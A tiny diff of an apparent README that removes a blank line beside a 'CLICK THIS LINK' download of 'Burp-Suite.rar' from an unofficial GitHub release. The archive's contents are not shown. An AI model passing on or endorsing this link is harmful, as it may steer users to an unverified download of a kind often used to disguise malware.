@@ -32,7 +32,6 @@
   
 ## Download Burp
 
-
 [CLICK THIS LINK](https://github.com/Maverick-25/Burp-Suite/releases/download/tool/Burp-Suite.rar)
 
 ![Logo](https://media.giphy.com/media/DLm2IJPuLnMTS/giphy.gif)
